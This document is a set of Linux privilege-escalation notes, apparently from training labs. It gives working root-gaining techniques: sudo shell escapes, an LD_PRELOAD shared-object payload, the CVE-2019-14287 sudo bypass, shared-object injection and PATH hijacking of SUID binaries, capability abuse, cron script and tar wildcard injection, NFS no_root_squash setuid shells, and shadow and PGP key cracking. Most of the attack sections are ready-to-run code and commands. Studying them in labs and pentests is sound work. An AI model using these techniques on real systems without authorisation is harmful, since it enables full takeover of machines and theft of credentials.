# Linux Priv Esc Notes

### Initial System Enum

##### Subdomain Enum
 - Using `wfuzz` tool built into kali:
```bash
wfuzz -c -f sub-fighter -w WORDLIST.txt -u 'http://example.com' -H "Host: FUZZ.example.com" --hw 290
```
 - The `--hw 290` means ignore responses that are 290 words in length. If there is a static 404 page, this is helpful.

##### System Enum:
 - Find system information, kernel, architecture, OS info, etc...
```bash
hostname
uname -a
cat /prov/version
cat /etc/issue
lscpu
```

 - View current processes (nfsd, cron, nginx,apache, ssh, etc...) and who they are running as.
```bash
ps aux
```


##### User Enum:
 - Who are we, what can we do, what priv/access do we have?
```bash
whoami
id
```

 - What can we run as sudo?
```bash
sudo -l
```

 - List users from /etc/password
```bash
cat /etc/passwd | cut -d : -f 1
```

 - Check history (never know what you might find).
 - Try `sudo su -`.


##### Network Enum:
 - Check network adapters, IP routes, etc...
```bash
ip a
ip route
ip neigh
```

 - Check for listeners (network and/or localhost)
```bash
netstat
ss
```


##### Password Enum
 - Search for phrase `password=` in files.
```bash
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
```

 - Search for files named with `password` in the file name.
```bash
locate password | more
```

 - Search for SSH keys.
```bash
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```



##### Kernel Exploits
 - Kernel is the middleware between software and hardware.
 - Check (Google) the kernel version `uname -a` and see if there are any exploits (i.e. dirtycow).



##### Passwords/SSH Keys
 - If you have access to `/etc/shadow` file you can copy the contents of it and the contents of `/etc/passwd`, then use a tool in Kali to combine the two files:
```bash
unshadow PASSWD_FILE SHADOW_FILE
```

 - Take the output of this and feed into Hashcat. Something like this in PowerShell:
```powershell
.\hashcat64.exe -m 1800 -a 0 -O .\toCrack\linuxHash1.txt .\passwordLists\rockyou.txt
```

 - Look for SSH private keys and see where they might lead. See if the root login is enabled in sshd config. There might be a private key backed up on the local machine for root login:
```bash
ssh -i PRIV_KEY_FILE root@x.x.x.x
```

 - Remember private key files must have 600 permissions set.



### Sudo
 - Check what you are allowed to run as root:
```bash
sudo -l
```

##### Shell Escaping & Functionality
 - Let's say you see the following that can be run with NOPASSWD:
```text
User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

 - We can use [GTFOBins](https://gtfobins.github.io) to search for the binary names, i.e. `vim` and goto the `Sudo` section.
 - From the site we can see that we can get a shell using the following command:
```bash
sudo vim -c ':!/bin/bash'
```

 - If there is nothing on GTFOBins, try and Google the application that you can run as root and see if there is any exploits. Also check man-pages/help-guides to see if there is any other functionality of interest for that application. Maybe reading/sending files.

##### LD_PRELOAD
 - Let's say you see the following after running `sudo -l`:
```text
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```

 - We can use this gain root.
 - Create & save the following C file:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
 - We then compile our the program:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

 - Finally we can the following command to get root, ASSUMING we can run at least 1 program as root with no password.
 - NOTE: we must include the full path to the file.
```bash
sudo LD_PRELOAD=/home/user/shell.so vim
```

##### CVE-2019-14287
 - Another thing to watch out for when running `sudo -l`
```text
User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
```

 - Specifically the `!root` part. This is vulnerable to the following attack:
```bash
sudo -u#-1 /bin/bash
```

 - This works because if you want to run a command as another user you can use:
```bash
sudo -u#UID COMMAND
```
 - When the UID is -1, it is handled incorrectly as 0, which is of course the UID of the root account.

 - More info at [Exploit DB => CVE-2019-14287](https://www.exploit-db.com/exploits/47502).


##### CVE-2019-18634
 - When you type in your password on Linux, normally you see nothing. However, if you see something like an asterisk for each char, then this means the `pwfeedback` is set.
 
 - If Sudo version is below 1.8.26, and `pwfeedback` is enabled, then root privilege can be gained via buffer overflow.

 - Check sudo version with:
```bash
sudo -V
```

 - Exploit code can be found [here](https://github.com/saleemrashid/sudo-cve-2019-18634).

### SUID Escalation
 - Check for files that have SUID bit set:
```bash
find / -perm -u=s -type f 2>/dev/null
```
 - Search for the files that are found on [GTFOBins](https://gtfobins.github.io).


##### Shared Object Injection
 - Look for files that have the SUID bit set.
 - We then use `strace` to see what the program is doing:
```bash
strace /usr/local/bin/suid-so 2>&1
```
 - There is too much be printed, so let's search for some specfic strings:
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

 - From the output we can see that the program tried to open a bunch of files that don't exists:
```text
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

 - Let's try and inject into the last file since it wasn't found.
 - Let's create a new file called `libcalc.c` and input the following code:
```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

 - Let's now compile, and move the binary into the location of the file that is trying to be opened (`/home/user/.config/libcalc.so`):
```bash
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
```

 - Now let's try and try and run the target program again:
```bash
/usr/local/bin/suid-so
```

 - We are now root.


##### Binary Symlinks
 - Vulnerability with older version of Nginx and is to do with the logs it creates.
 - This is useful if we are the `www-data` user and are trying to get `root`.
 - For this to work, the SUID bit needs to be set on `/usr/bin/sudo`

 - Using the find command we can see this is the case on this box:
```text
sh-4.1$ find / -type f -perm -04000 -ls 2>/dev/null

809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
```

 - We can use `linux-exploit-suggester` to see if Nginx is vulnerable, and these use the provided script to attempt escalation:
```bash
./nginxed-root.sh /var/log/nginx/access.log
```
 - For this to work, the Nginx daemon needs to re-open the log file. Either the process needs to be restarted, or the daemon needs to receive the USR1 process signal (which happens daily on Debian based systems). It can be invoked manually with root using the following command:
```bash
invoke-rc.d nginx rotate >/dev/null 2>&1
```


##### Environment Variables
 - Using the find command again, we notice that we can run some odd programs as root that have the SUID bit set:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
```text
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18 13:02 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
```

 - Let's have a look at the `/usr/local/bin/suid-env` binary.
 - Running the program, it doesn't seem to be that useful:
```text
[....] Starting web server: apache2httpd (pid 1490) already running
.ok
```

 - Let's run the strings command on this binary see what we get:
```text
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

 - Okay this is interesting, it's using the service command.
 - We can run the `service` command without a full path because the computer checks the `$PATH` env variable to try and find it.
 - Because of this, we can create our own `service` program that will be executed as `root` and then add the path to it as root.
 - To create the program:
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
```
 - We now need to add the `/tmp` folder to the start of our `$PATH` env variable so that it finds our malicious `service` program first.
```bash
export PATH=/tmp:$PATH
```
 - We now run the original binary and we are root.


 - Now let's say that the `strings` command give us the following:
```text
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

 - We can't do what we did before because the full path is there.
 - What we can do is create a malicious function and export it to an env variable:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
export -f /usr/sbin/service
```
 - We now run the affected binary and we are root.


### Capabilities
 - We can use the following command to search for capabilities:
```bash
getcap -r / 2>/dev/null
```
 - We get the following line as output:
```text
/usr/bin/python2.6 = cap_setuid+ep
```

 - The `+ep` is the important part, this essentially means `everything permitted`.
 - Because of this, `python2.6` will be run as root.
 - To exploit this we just need some code to get a shell:
```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

 - Now we are root.


### Scheduled Tasks
 - We can have a look at what tasks are scheduled, when they will run, what command, & what user they will run as.
```bash
cat /etc/crontab
systemctl list-timers --all
```

 - Note that there are multiple commands that may be used, some may be blocked so check [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

##### Cron Paths
 - The output of the `cat /etc/crontab` command is the following:
```text
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

 - From here we can see that `overwrite.sh` is being run every minute by the `root` user. If we look at the `PATH` above, we can see that `/home/user` is the first place checked. If we check this folder, there is no `overwrite.sh` file. This means we should be able to create our own file and have it run as root.
 - We can create a malicious file to help get `root` with the following:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

 - After waiting a minute or so for the cron job to run, we should have a new file `/tmp/bash`.
 - We can then run this and get a shell as `root`:
```bash
/tmp/bash -p
```

##### Cron Wildcards
 - In the above cron job output we can see the following:
```text
* * * * * root /usr/local/bin/compress.sh
```
 - The `compress.sh` program is being run every minute. Let's have a look at the contents:
```text
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

 - Notice the wildcard at the end of the `tar` command. Let's see how we can exploit this.
 - Let's create a malicious script again:
```bash
echo 'cp /bin/bash /tmp/bash2; chmod +s /tmp/bash2' > /home/user/runme.sh
```
 - Now well add some extra parameters for the `tar` command when it runs:
```bash
chmod +x runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

### NFS Root Squashing
 - Check contents of `/etc/exports` and look for `no_root_squash`.
```bash
cat /etc/exports
```
```text
# /etc/exports: the access control list for filesystems which may be exported
#       to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

 - Notice this line near the bottom:
```text
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

 - This is good. This means that the `/tmp` folder is accessing over the network, and whatever we do will be done as `root`. Let's see how to exploit this.

##### On the Attacker Machine

 - `apt install nfs-common` may need to be run if Kali is older.

 - Run one of the following:
```bash
showmount -e TARGET_IP
nmap -sV --script=nfs-showmount TARGET_IP
```

 - After running the nmap version, we see the following:
```text
Export list for 10.10.134.66:
/tmp *
```
```text
111/tcp open  rpcbind 2 (RPC #100000)
| nfs-showmount: 
|_  /tmp *
| rpcinfo: 
```

 - Let's now mount this folder on our attacker computer:
```bash
mkdir /tmp/mountme
mount -o rw,vers=2 10.10.134.66:/tmp /tmp/mountme
```

 - Now the folder is mounted, let's upload a malicious file:
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/mountme/shell.c
gcc /tmp/mountme/shell.c -o /tmp/mountme/shell
chmod +s /tmp/mountme/shell
```

##### On the Target Machine
 - If we go back to the target machine and `cd` into the `/tmp` folder, we can see the files we just created from the attacker machine:
```text
-rwxr-xr-x  1 root root  16712 Sep 27 06:13 shell
-rw-r--r--  1 root root     67 Sep 27 06:13 shell.c
```
 - Notice that they were created as root. This is because of the `no_root_squash`.

 - As a normal user, we just need to run this program and well will be `root`:
```bash
./shell
```


### Other Random

##### PGP & ASC
 1. Convert from PGP private key to hash format
```bash
gpg2john PRIV_KEY.asc > OUTPUT_HASH_FILE
```

 2. Crack the hash using `John`
```bash
john OUTPUT_HASH_FILE -w=WORD_LIST_FILE
```

 3. Import the Private key (You'll need the cracked password from part 2)
```bash
gpg --import PRIV_KEY.asc
```

 4. Decrypt using the private key (You'll need the cracked password from part 2)
```bash
gpg --decrypt PAYLOAD.pgp
```